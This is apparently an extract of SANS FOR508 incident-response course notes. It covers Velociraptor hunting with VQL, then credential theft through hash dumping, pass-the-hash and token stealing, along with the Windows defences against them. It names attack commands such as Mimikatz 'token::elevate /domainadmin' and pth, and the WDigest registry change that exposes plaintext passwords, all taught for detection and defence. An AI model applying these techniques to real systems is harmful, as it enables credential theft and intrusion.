artifacts

• Easy to modify
• Use a built-in artifact as a template to
create your own
•
Share back your custom artifacts

For example, change "Name"
to "CommandLine" to filter
on EXE paths & parameters

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

113

.

While VQL provides the plumbing for performing queries against hosts, “artifacts” provide a way to
conveniently store and execute those queries repeatedly. The idea is that analysts need quick and convenient
ability to hunt for IOCs. So, Velociraptor “artifacts” are simply preconfigured queries for the most common
analysis jobs. Example built-in artifacts include queries for listing user accounts, finding historical evidence of
process execution, searches for specific files or directories, file retrieval, and so on.
While some built-in artifacts are ready to use as-is, others need tweaking for the specific query an analyst wants
to perform. Or perhaps an entirely new artifact is necessary. In those cases, a new artifact can be created by the
analyst, or existing artifacts can easily be copied and customized. For example, at the time of this writing, there
isn’t a built-in artifact to search processes for specific command-line arguments. However, there is a built-in
artifact called Windows.System.Pslist to search for running processes by name. That artifact accepts a regular
expression to filter on the process “Name” field. A simple custom artifact can be created by copying the built-in
artifact and changing the VQL to run a regex filter against the “CommandLine” field instead (or in addition).
Here’s a look at the default Windows.System.Pslist artifact:
SELECT Pid, Ppid, TokenIsElevated, Name, CommandLine, Exe,
hash(path=Exe) as Hash,
authenticode(filename=Exe) AS Authenticode,
Username, Memory.WorkingSetSize AS WorkingSetSize
FROM pslist()
WHERE Name =~ processRegex
Creating a custom version and changing “Name” to “CommandLine” in the WHERE statement allows us to use
a regular expression to filter on processes’ command-line paths and arguments rather than just the name.
The Velociraptor website hosts an “Artifact Exchange” for analysts to share custom artifacts.[1] Some of the
most useful shared artifacts eventually make it into the official Velociraptor release as default artifacts.
[1] Velociraptor’s Artifact Exchange: https://for508.com/jyhtp

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

113

Hunting with Velociraptor

Notebook provides a view of returned data via the WebUI

List of
hunts
across
the
network

Check finished client
count and optionally
download results

The Overview tab shows key settings for
the hunt, such as the artifact(s) used in
the hunt and any parameters provided
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics 114

.

The Velociraptor WebUI (aka GUI) provides a full-featured interface for configuring analysis jobs and
reviewing results. As an example, we show in the slide above a set of hunt results. Velociraptor “Hunts” are
scheduled queries that are active by default for 7 days. While active, any clients that match the selection criteria
specified when the hunt was created will run the job once they come online. For clients that are active when the
hunt is first executed, they will typically return results immediately. For clients that are offline, they will return
results once the come back online and receive the job request.[1]
The Details pane on the bottom of the screen will show some key information about each hunt, such as the
artifact name(s) used in the hunt (multiple artifacts can be run in the same hunt) and any parameters specified by
the analyst for the artifact(s). It also includes client counts and a button for downloading the resulting data. Not
pictured is a Notebook tab that will list acquired data from the hunt. Additional filtering can be performed in the
notebook by editing the default VQL query.
[1] Hunting - What Velociraptors Do Best!: https://for508.com/mhsu1

114

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Data Analysis with Velociraptor

• How can you analyze
hunt collections?
• Primary analysis
options include:
✓ Built-in Notebooks
✓ Export to CSV or JSON
✓ Export to Elastic or Splunk

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

115

Velociraptor excels at parsing forensic artifacts and collecting the results back to the server. Efficient data
collection is a huge part of the equation for large-scale incident response and threat hunting. A close second, if
not equal, is providing effective means to analyze the collected data. Fortunately, Velociraptor also provides
flexible options for analysis.

.

Built into the UI is the ability to review collected data through a “Results” tab. The Results tab provides a
default view of all collected data. It includes a transformation button that allows for sorting and filtering the
displayed data. (Note that the Results tab is only available for flows displayed on a specific client’s Collected
Artifacts page, whereas the “Notebook” tab is available on both the Hunt Manager page and the per-client
Collected Artifacts page. Of course, this is subject to change with new versions of Velociraptor.)
By default, the Notebook tab provides a view showing the first 50 rows of the collection. The notebook can
transform the data by editing a VQL defining what results are shown, and how they are shown. For example, the
default “LIMIT 50” statement can be removed or increased to see more rows in the notebook. Another default is
to show all available columns in the table, but that can sometimes become cumbersome. To adjust, it is easy to
change the default “SELECT *” statement to display only the columns of interest. There is almost no limit to the
ways that the data can be transformed. We’ll provide some guidance on using VQL to transform the notebook
on the next slide.
There are times where the notebook may not meet the analyst’s needs. Transforming the data in the notebook
takes some practice, so new users may prefer to simply export the results to CSV or JSON to analyze with
external tools. If the collected data is not too large, then viewing exported CSV data in Timeline Explorer is
generally a great option. Keep in mind though that some of the collected columns include nested JSON, and
those columns don’t typically display well in Timeline Explorer.
Another option is to use built-in artifacts to export the data directly to Splunk or Elasticsearch. This is a terrific
option for teams familiar with those technologies. It’s also an important feature to take advantage of for larger
deployments. When a Velociraptor deployment gets larger than a few thousand clients, the server can get
bogged down by handling both the client communications and the analysts’ data queries. So, in those scenarios,
it begins to make sense to offload the analysis work to a dedicated server. Elasticsearch and Splunk are great
options for this use case.
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

115

VQL Data Transformations
Question: How do you take a hunt with a lot of rows down to the rows that really matter?
Answer: Filter, sort, and stack with VQL in Notebooks!
Data Operation

VQL Operator

Example VQL

View specific columns

SELECT <column> FROM

SELECT Exe,Hash FROM source()

Expose nested JSON field

<column>.<nested field name>

SELECT Exe,Hash.MD5 FROM source()

Filter for keyword

WHERE <column> =~ ‘keyword’

WHERE Exe =~ ‘mimikatz’

Negate filter for keyword

WHERE NOT <column> =~ ‘keyword’

WHERE NOT Exe =~ ‘svchost’

Join multiple filters

Use Boolean AND|OR

WHERE NOT Exe =~ ‘svchost’ AND NOT Exe =~ ‘edge’

Group like values

GROUP BY <column>

GROUP BY Hash.MD5

Count occurrences

count() AS <new column name>

SELECT Exe,Hash.MD5,count() AS Count FROM source()

Sort alphanumerically

ORDER BY <column> <DESC>

ORDER BY Count (default order is ASCENDING)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

When first starting with Velociraptor, using notebooks for data analysis can feel like a bit of a hurdle. However,
with a little knowledge of some useful VQL data transformation techniques, it’s possible to become quite
proficient in a short amount of time. You will also find that you repeat the same few commands over and over
during analysis.

.

This slide is designed to be a helpful reference for some of the most common VQL operations for filtering,
sorting, and stacking data during analysis. In the upcoming lab, you will have a chance to implement many of
these transformations to review data collected from Stark Research Labs. Practicing these techniques is
generally the best way to learn them. They are also a great introduction into the types of query languages you
might find in database products like Splunk and Elastic (every product is slightly different, but learning one
makes the next one trivial to pick up).

116

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

116

Where Do You Want to Go Today?
With a huge variety of built-in artifacts, and the ability to customize them easily,
there’s almost no limit to Velociraptor’s hunting and analysis capabilities!
Filesystem Timeline

Memory Acquisition

Autoruns

Windows Timeline

Processes, DLLs

Permanent WMI Events

Prefetch Timeline

VAD, Handles, Mutants

Scheduled Tasks

KAPE Triage

Impersonation Tokens

Service Creations

Volume Shadow Copy

Netstat, ARP

Certificate Store

MFT, $I30

DNS Queries

SRUM, BAM

File Finder

Event Logs

ShimCache, AmCache

YARA Scanning

User ProfileList

UserAssist

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

It is not an exaggeration to say that almost any aspect of a client can be analyzed with Velociraptor, especially
once the analyst learns how to use VQL effectively. That said, Velociraptor fortunately comes with over 250
built-in artifacts, so learning the ins and outs of VQL is not an immediate requirement.

.

To get a feel for some of the more interesting artifacts that come with Velociraptor, we’ve listed some favorites
in the table above. Most are Windows-focused artifacts, but there are also plenty of others for Linux and
macOS.
Keep in mind that taking existing built-in artifacts and making slight adjustments can be a simple way to create
powerful new custom artifacts. A little bit of experimentation will go a long way. So, there’s no excuse, the
opportunity to become very proficient with Velociraptor is before you!

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

117

117

Optional Homework
Lab 1.3
Creating Triage Images with KAPE
Average Time: 25 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

118

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

118

Lab 1.4
Scaling Incident Response and Threat Hunting
Average Time: 40 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

119

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

119

Advanced Incident Response and Threat Hunting Agenda

Incident Response & Threat Hunting
Threat Intelligence
Malware-ology
Malware Persistence
Incident Response: Hunting Across the Enterprise
Credential Theft
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

120

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

120

Credential Theft

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

121

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

121

Lateral Movement Overview: Gain Authority
Credential Harvesting and Account Creation

Gain
Authority

Remote Desktop Services
Windows Admin Shares
Copy
Malware

PsExec
Windows Remote Management Tools

Execute
Malware/
Commands

PowerShell Remoting/WMIC
Vulnerability Exploitation and Application Deployment Software
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

When performing incident response, it is important to understand attacker behavior so you can quickly “get to
where the hackers are”. Lateral movement is essential to the ability to compromise a network and accomplish
the attacker’s objectives. Understanding the universe of possible lateral movement tools and techniques allows
responders to better find and anticipate attacker activity. In this section, we will cover the most common forms
of lateral movement.

122

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Credential Harvesting

• Priority #1 post-exploitation
• Domain admin is ultimate goal

Detection
• Event Logs*
• 4624 Logons
• 4720 Account creation
• 4776 Local account auth
• 4672 Privileged acct usage
• Unix “secure” logs
• Auditing new accounts
• Anomalous logins
• Workstation to workstation

• Nearly everything in Windows is
tied to an account
• Difficult to move without one

• Easy and relatively stealthy
means to traverse the network
• Account limitations are rare

• “Sleeper” accounts can provide
access after remediation

• Sensitive networks
• After-hours logins
* Event logs and IDs will be covered in the next section

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

123

.

Attackers prioritize the collection of credentials almost immediately after the post-exploitation phase of the
attack cycle. Attackers rarely have the level of access necessary to move freely throughout the enterprise at the
time of initial compromise. Privilege escalation or the collection of additional and more privileged credentials is
almost always required to fully compromise a network. Many of the lateral movement techniques discussed in
this section require legitimate credentials (or elements thereof). Since nearly every activity in Windows is tied to
an account, it can be difficult to laterally move without a privileged account (vulnerability exploitation is one of
the few exceptions).
Luckily, account activity is easy to monitor and track. Assuming your enterprise centrally collects and manages
logs, tracking account usage is very feasible (especially ultra-privileged accounts like domain admin). Both
Windows and Unix provide excellent logging of account activity. In addition to privileged and known
compromised account tracking, analysts should also monitor for new account creations. These events occur
infrequently and are used by some threat actors to evade monitoring or create “sleeper” accounts that maybe
escape remediation efforts and allow immediate access back into the enterprise post-breach. As monitoring and
account management efforts become more mature, identifying anomalous logins between devices, network
segments, and times of day can be achieved. As an example, a very common attacker behavior is to laterally
move between workstations, which is rare in most server-client models. This lateral movement capability can be
limited and audited.
A common account vulnerability present in many enterprises is a shared local admin account utilizing the same
password across many devices. In this scenario, the compromise of one system allows lateral movement to many
others, along with the possibility of collecting more credentials at each additional system accessed. Local
account usage is rare in the enterprise and can be easily monitored via event logs. When paired with other
account monitoring including privileged account usage, abuse can often be identified. This common
vulnerability has not gone unnoticed by Microsoft, and the most recent operating systems have greatly limited
the capabilities of a local administrator account. As an example, a local admin account cannot remotely write to
C$ and Admin$ shares and cannot use some remote management tools like schtasks, at, or WMI (Note: if the
Windows Remote Management service is enabled, WMI/PowerShell will still work using a local admin
account). Please note that these protections do not apply to the built-in admin account, RID 500, which
unfortunately many organizations still enable and use.
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

123

Finally, enterprises can further reduce their attack surface by creating unique passwords for every local admin
account and denying network logons for these accounts.[1]

.

[1] Technet – Local Accounts: http://for508.com/prc2-

124

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Evolution of Credential Attack Mitigation

✓ User Account Control
(UAC)
✓ Managed Service
Accounts
✓ KB2871997

✓ SSP plaintext
password mitigations
✓ Local admin remote
logon restrictions
✓ Protected Processes
✓ Restricted Admin
✓ Domain Protected Users
Security Group
✓ LSA Cache cleanup
✓ Group Managed Service
Accounts

✓ Credential Guard
✓ Remote Credential
Guard
✓ Device Guard
(prevent execution of
untrusted code)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

125

Credential theft problems in Windows should take no one by surprise. It has been an issue since the very
beginning. Unfortunately, like many other security issues in Windows, poor initial credential implementation
coupled with the ever-present backward compatibility demands has been Microsoft’s nemesis in securing the
operating system.

.

Vista/Windows 7
The Windows XP era was a security low point, and several mitigations were baked into the Vista/Windows
7/Server 2008R2 release. Mandatory access control and least privilege support were implemented with a new
feature called User Account Control (UAC). Fewer applications required elevated privileges and admin
accounts were restricted to user-level permissions by default (for web surfing or file opening).[1] Note that while
UAC can be helpful, it was not designed to be a security boundary and does not employ important barriers like
process isolation.[2]
Managed Service Accounts were released with Server 2008R2 and are one of the few mitigations available to
combat some of the most advanced Kerberos ticket attacks. This feature specifically helps with service accounts
being run with domain account rights. It provides both frequent password changes (30 days by default) and long
and complex passwords for these accounts.[3] While an excellent idea, the initial implementation was lacking.
The latest iteration, Group Managed Service Accounts, is much more flexible and admin-friendly.
Note that KB2871997 nicely backported many of the protections released in Windows 8 to Windows 7/Server
2008R2, but some protections still require an Active Directory functional level set to at least 2012R2.[4]
Windows 8.1
Credential attack mitigations were one of the few things to get excited about during the Windows 8/8.1 release.
Microsoft took a hard look at the havoc being caused by tools and techniques like Mimikatz and pass the hash
and decided to act. CredSSP and other single sign-on (SSO) credentials like TsPkg and Wdigest are no longer
cached in memory by default. This removes the Mimikatz ability to recover plaintext credentials from these
sources. A new security group was added to facilitate restricting local (admin) accounts from network or remote
interactive logons to domain-joined systems. This breaks pass-the-hash attacks, mounting remote shares, remote
WMI, PsExec, and remote scheduled tasks using local administrator accounts (a favorite technique of attackers
who discover a shared local admin account).
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

125

The concept of protected processes was introduced in Windows 8. Protected processes can only load signed
code and can only be attached to by other protected processes.[5] The LSASS process, in particular, was singled
out as protected in order to defeat many of the common credential dumping tools that inject code into LSASS to
collect credentials. Unfortunately, protection is off by default and is unlikely to get rolled out widely through the
enterprise. Mimikatz gets around this protection via a signed driver.
Two new account protections also debuted in Windows 8. Remote Desktop can now be executed using the
“/restrictedAdmin” switch, ensuring that credentials and tickets are not pushed to target systems during
interactive RDP sessions (it can also be forced for accounts using Group Policy). This feature was originally on
by default on Server 2012 but subsequently changed to off by default due to the unintended consequence of
opening up RDP sessions to pass-the-hash attacks. It has been succeeded by Remote Credential Guard in
Windows 10+. More important than Restricted Admin is the Domain Protected Users security group. This group
is designed to protect high-value (privileged) accounts. Members of the group cannot authenticate via weak (and
often abused) NTLM, CredSSP, or Digest Authentication.[6] This defeats some Mimikatz capabilities and passthe-hash tools. Credentials are not cached on systems and tokens cannot be delegated (removing the threat of
cached credentials and token stealing). NT hashes are not cached on remote servers. Finally, Kerberos ticket life
is reduced (to four hours) and the weaker RC4 ticket encryption is denied, which is used by multiple ticketbased attacks. Needless to say, the Domain Protected Users Group is one of the most important security features
added to this release.
Finally, Windows 8 also improved upon the cleanup of credentials after termination of user sessions and
released an improved capability to administrate and protect service accounts named Group Managed Service
Accounts.

.

Windows 10 and 11
With the release of Windows 10, Microsoft improved upon the previous security additions in a few important
ways. Credential Guard is a game changing technology that isolates hashes and tickets using a security boundary
enforced by machine virtualization.[7] While it has software and hardware requirements and will be some time
before it is widely deployed, it effectively defeats all of the current user account hash and ticket dumping
techniques currently in the wild. Remote Credential Guard is an update to Restricted Admin and protects any
account (not just admin) during RDP sessions. Finally, Device Guard is a new take on application control that
can lock down systems to prevent untrusted code (like credential dumping utilities) from running on a system.
While very effective, it appears to be challenging to tune and will likely only be found on a limited number of
very important systems in the enterprise. Windows 11 inherits the improvements introduced in Windows 10 with
no substantive changes.
[1] User Account Control and Virtualization: http://for508.com/fj8z6
[2] Inside Windows 7 User Account Control: http://for508.com/mrs1j
[3] Introducing Managed Service Accounts: http://for508.com/z1yui
[4] Update to Improve Credentials Protection and Management: http://for508.com/gakif
[5] Configuring Additional LSA Protection: http://for508.com/a1xiz
[6] Protected Users Security Group: http://for508.com/jare0
[7] Protect Derived Domain Credentials with Windows Defender Credential Guard: http://for508.com/wt28b

126

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Compromising Credentials: Hashes

Hashes
Tokens
Cached
Credentials
LSA Secrets
Tickets
NTDS.DIT

The password for each user account in Windows is stored in
multiple formats: LM and NT hashes are most well-known.
TsPkg, WDigest, and LiveSSP can be decrypted to
provide plaintext passwords (prior to Win8.1)
How are they acquired and used? Hashes are available
in the LSASS process and can be extracted with admin
privileges. Once dumped, hashes can be cracked or used
immediately in a pass-the-hash attack.
Common tools: Mimikatz • fgdump • gsecdump •
Metasploit • AceHash • PWDumpX • creddump • WCE

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

127

.

When discussing credential compromise, account password hashes are an excellent place to start. Windows
stores credentials in a variety of different formats. The most commonly known are LM (deprecated) and NT
hashes. Local account password hashes are available in the SAM registry hive and domain account hashes are
present in memory during interactive sessions. Several standard attacks allow an attacker access to these
credentials: memory extraction directly from LSASS, dumping the LSASS process for offline attacks, and
extraction of local account hashes from the SAM hive in memory or on disk. Administrator privileges are
required for all of these attacks. Once the hashes are dumped, they can be easily cracked with tools like John the
Ripper or via rainbow table pre-computation attacks. Alternatively, they can be used for authentication in their
original form (see Pass the Hash below). A domain user account must interactively log on to a system for its
hash to be present in memory, and the hashes are only available while the user is logged on (unless applications
or processes are still using them after logging off).[1]
Cleartext Passwords
Researchers have also found many other types of stored credentials in memory, some of which can be easily
extracted and decrypted, resulting in cleartext passwords. Some of these are a result of single sign-on (SSO) like
TsPkg and Wdigest, while another, LiveSSP, is derived from the new Windows “Live” cloud accounts that can
now be used to log on. Mimikatz was the first tool to bring many of these vulnerabilities to the mainstream, and
now tools like Windows Credential Editor (WCE) can be used to extract them as well.[2]
Pass-the-Hash Attacks
Pass the hash allows an attacker to authenticate using a stolen account hash without ever knowing the cleartext
password.[3] This is incredibly useful to an attacker who has managed to capture a highly privileged hash and
(sadly) defeats even the longest and most complex passwords (because no cracking is necessary). Several tools
facilitate this attack, including the Metasploit PsExec module, WCE, and SMBshell. Pass the hash is limited to
NTLM authentication and takes advantage of the fact that only the hash is necessary to respond to an NTLM
challenge-response protocol. While most authentication in a Windows enterprise is now using Kerberos, NTLM
is still almost always available. Pass-the-hash attacks typically take advantage of the SMB protocol to map file
shares and perform PsExec-style remote execution, but they can also be used by many native tools, including
WMI.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

127

.

[1] Protecting Privileged Domain Accounts: Safeguarding Password Hashes: http://for508.com/7jyl6
[2] Mimikatz a Short Journey Inside the Memory of the Windows Security Service (PDF):
http://for508.com/j1t3z
[3] Whitepaper: Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft Techniques (PDF):
http://for508.com/cxhg2

128

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Credential Availability
Admin Action

Logon
Type

Credentials
on Target?

Notes

Console logon

2

Yes*

*Except when Credential Guard is enabled

RunAs

2

Yes*

*Except when Credential Guard is enabled

Remote Desktop

10

Yes*

*Except for enabled Remote Credential Guard

Net Use

3

No

Including /u: parameter

PowerShell Remoting

3

No

Invoke-Command; Enter-PSSession

PsExec alternate creds

3+2

Yes

-u <username> -p <password)

PsExec w/o explicit creds

3

No

Remote Scheduled Task

4

Yes

Password saved as LSA Secret

Run as a Service

5

Yes

(w/user account)—Password saved as LSA Secret

Remote Registry

3

No
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics 129

.

One solution to the Windows credential problem is education. The security community has developed best
practices over time for reducing the likelihood of leaving behind high-privileged derived credentials. However,
this information has largely not filtered down to the admin community (where it is most important). Very
simply, it matters immensely how an administrator authenticates to a Windows system. Interactive logons at the
console, via RDP, and using runas, cache hash and ticket credentials on the target system. They should not be
used for highly privileged accounts. PowerShell remoting is a much more secure option, as is enabling new
Windows 10+ protections like Remote Credential Guard. Even something as simple as adding an explicit
username and password (similar to a runas) on the PsExec command line makes the difference as to whether
credentials will be available for possible theft. Remote scheduled tasks and services are also very dangerous—
we will cover the corresponding LSA Secrets they leave behind later in this section.
This table was inspired by a similar one available on Microsoft Learn.[1]
[1] Administrative tools and logon types reference: https://for508.com/4e60v

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

129

Hash Dumping (Gsecdump)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In this example, we see the gsecdump tool executed on a Domain Controller. On a standard system, we would
expect to only see hashes available from currently logged on sessions. However, the DC is a special case, as it
facilitates many logged on sessions. This is the reason why we often see attackers executing credential dumping
tools on DCs, even though it is risky due to increased monitoring and protections. In this example, there were
hundreds of hashes available from the gsecdump output.

130

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

130

.
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

131

Pass the Hash (Mimikatz)

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

.

Once a Windows NTLM hash is extracted, it can immediately be used to authenticate, with no cracking
necessary. In this example, Mimikatz was used with the pth option to authenticate to a remote system
(10.3.58.7). The srl-helpdesk account hash successfully authenticated to the remote system, opening an
interactive command shell via the PsExec tool. Note that the latest versions of Mimikatz have replaced the
“pth” command with functionality that technically performs an attack called “Overpass the Hash”, which we
will cover later in this section. From the user perspective the results are the same, but if you are ever trying to
simulate true pass the hash for testing tools or defenses, Metasploit keeps true to the original implementation.

132

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

132

.
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

133

Defending Credentials: Hashes

• Prevent admin account compromise
• Stop remote interactive sessions with highly
privileged accounts
• Proper termination of RDP sessions
• Win8.1+ → force the use of Restricted Admin?
• Win10+ → deploy Remote Credential Guard

• Upgrade to Windows 10+
• Credential Guard
• TsPkg, WDigest, etc.: SSO creds obsolescence
• Domain Protected Users Group (PtH mitigation)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The best way to protect hashes is to not interactively log in to systems with highly privileged accounts and stop
attackers from gaining local administrative rights that can allow credential stealing. Hashes are only present
during interactive logon sessions. Thus, avoiding console logons, RDP, and runas will ensure hashes are not at
risk. This is most important on systems like servers, where multiple users may log on, and attackers can easily
wait in hiding for a “high-value” account to log in. Perhaps even more common are hashes stolen due to
improper termination of RDP sessions. Hashes persist on a system while an interactive session is open. If a
session is disconnected, but not closed, the hash can persist on a system while that session is still present. Group
Policy can be used to “set a time limit for disconnected sessions”, effectively terminating old RDP sessions.
Note that if this value is set too low, it could result in lost work due to normal network connection issues.
Microsoft has recently taken major steps to reduce hash vulnerabilities. Windows 8.1+ no longer stores WDigest
and TsPkg credentials by default. However, WDigest plaintext credentials can be re-enabled by an attacker by
updating HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest with a
“1” in registry value “UseLogonCredential”. [1] This would be an excellent key to audit for any
unexpected changes or additions (the value is not present on Win8.1+ systems by default). Windows 8.1 also
introduced several pass-the-hash mitigations, including Restricted Administrator accounts, the Domain
Protected User security group, and Protected Processes.[2] Windows 10 introduced Credential Guard and Remote
Credential Guard. Restricted Admin accounts and systems with Remote Credential Guard enabled do not make
hashes (or tokens) available on the remote system, even during interactive logons like RDP. The Domain
Protected Users group cannot authenticate via NTLM, WDigest, or SSP, and it does not cache credentials.
Protected Processes will only execute signed code, breaking many current code injection techniques used to
dump credentials from LSASS (if enabled as a protected process). Local administrator accounts can be easily
restricted from authenticating over the network—including Pass the Hash—unless they happen to be the RID
500 built-in administrator account.[3] Credential Guard debuted with Windows 10, which uses a hypervisor to
move domain credentials, tickets, and hashes from LSASS into an isolated process (LSAIso) that can better
protect them. All of these mitigations can be defeated, but in short, it is now much more difficult to gather
hashes and execute pass-the-hash techniques on Win8.1+ systems.
A final defense is to ensure that local administrator account passwords are unique and not shared across the
workstation segment. Microsoft released the Local Administrator Password Solution (LAPS) to centralize
134

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

134

security and management of these accounts within Active Directory.[4] Hashes become much less useful when
they cannot be used elsewhere.

.

[1] Microsoft Security Advisory Update to Improve Credentials Protection: https://for508.com/q1v9h
[2] TechNet Credentials Protection and Management: http://for508.com/306oh
[3] Blocking Remote Use of Local Accounts: http://for508.com/zve0b
[4] Local Administrator Password Solution: http://for508.com/mbrx6

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

135

Compromising Credentials: Tokens

Hashes

Tokens
Cached
Credentials
LSA Secrets
Tickets
NTDS.DIT

Delegate tokens are powerful authentication resources
used for SSO. They allow attackers to impersonate a
user’s security context, including over the network.
How are they acquired and used? The
SeImpersonate privilege lets tokens be copied from
processes. The new token can then be used to
authenticate as the new user. A target user or service
must be logged on or have running processes.
Common tools: Incognito • Metasploit •
PowerShell • Mimikatz
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Every Windows logon and process has an associated security token. A token contains security context and
privileges for an account. Special tokens, named impersonate and delegate, facilitate access control and single
sign-on (SSO), specifically allowing processes to be run under a different account security context. Impersonate
tokens allow local security context shifts, and the more powerful delegate tokens facilitate authentication even
across network resources. The latter are commonly present during interactive logons, but certain non-interactive
Microsoft services also rely upon delegate tokens.[1]
Token Stealing
If a token is present on the system, a user with the SeImpersonate privilege (or with the admin or SYSTEM
privileges necessary to add it) can extract the token and reuse it to do a variety of tasks like local privilege
escalation, adding users or managing group membership, and mapping remote admin shares or running PsExec
(delegate tokens only).[2] Attackers commonly use this technique to elevate privileges from local admin to
domain admin. The attack is also particularly useful in situations where hashes cannot be easily extracted from
LSASS, such as when it is designated as a Win8.1+ Protected Process.
In modern Windows systems (post-Windows 2003SP1), tokens are present only when an account is logged in.
Servers are a particularly lucrative place to find them since they may have simultaneous users. Another
commonly exploited vector is on systems where an administrator has connected via RDP but did not perform a
proper session termination (i.e., they closed the RDP client without logging out).
[1] Protecting Privileged Domain Accounts: Safeguarding Access Tokens: http://for508.com/zmyn0
[2] Security Implications of Windows Access Tokens (PDF): http://for508.com/6zb1t

136

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

136

Token Stealing (Mimikatz)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

137

.

A classic token stealing attack is shown here. The attacker was authenticated using a local admin account named
“tdungan”. The Mimikatz tool was run with the built-in command “token::elevate /domainadmin”. This
command identifies any domain administrator tokens present on the system, retrieves them, and loads them into
process memory so the higher-level privileges can be used.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

137

.
138

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Defending Credentials: Tokens

• Prevent admin account compromise
• Stop remote interactive sessions with highly
privileged accounts
• Proper termination of RDP sessions
• Win8.1+ → force the use of Restricted Admin Mode?
• Win10+ → deploy Remote Credential Guard

• Account designation of “Account is Sensitive and
Cannot be Delegated” in Active Directory
• Domain Protected Users security group accounts do
not create delegate tokens
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

139

.

Similar to password hashes, the best way to protect sensitive tokens is to not interactively log in to systems with
highly privileged accounts and stop attackers from gaining local administrative rights that can allow token
stealing. Coveted “delegate“ tokens are only present during interactive logon sessions.[1] Thus, avoiding console
logons, RDP, and runas largely removes the ability to steal delegate tokens (note that Mike Pilkington discusses
a few edge cases where network logons can also utilize delegate tokens[2]). Delegate tokens are most dangerous
on systems like servers, where attackers know multiple users may log on and can easily wait in hiding for a
“high-value” account to log in. Perhaps even more common are tokens stolen due to improper termination of
RDP sessions. If a session is disconnected but not closed, the token can persist on a system while that session is
still present. Group Policy can be used to “set a time limit for disconnected sessions”, effectively terminating old
RDP sessions. Note that if this value is set too low, it could result in lost work due to normal network connection
issues.
Luckily, there are more rigorous ways to lock down delegate tokens rather than relying on good user behavior.
In Windows 8.1+, forcing an account to use “Restricted Admin” prevents hashes and tokens from being
available on the remote system during interactive logons like RDP.[3] High-value accounts can also be
designated in Active Directory as not able to be delegated.[4] Make sure to test this, as it will break some
capabilities of these accounts (some infrastructure relies upon token delegation) and may not be feasible for all
highly privileged accounts. This exercise might help with the development of a tiered account approach, helping
isolate dangerous accounts using least privilege methodology. Remote Credential Guard, introduced in
Windows 10/Server 2016, was designed to fix some of the issues with Restricted Admin, including the
delegation issue for third-party resources and protection of non-admin accounts.
Perhaps the most elegant solution now exists in Windows 8.1+ systems. Members of the Protected Users
security group do not create delegate tokens, even during interactive sessions. Again, these accounts will not be
able to be used for every administrative function, but this group is a great place for generic domain-admin level
accounts.[5]

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

139

.

[1] Monitoring for Delegation Token Theft: http://for508.com/4nv9m
[2] Protecting Privileged Domain Accounts: Safeguarding Access Tokens: http://for508.com/6c0n3
[3] TechNet Credentials Protection and Management: http://for508.com/k69i3
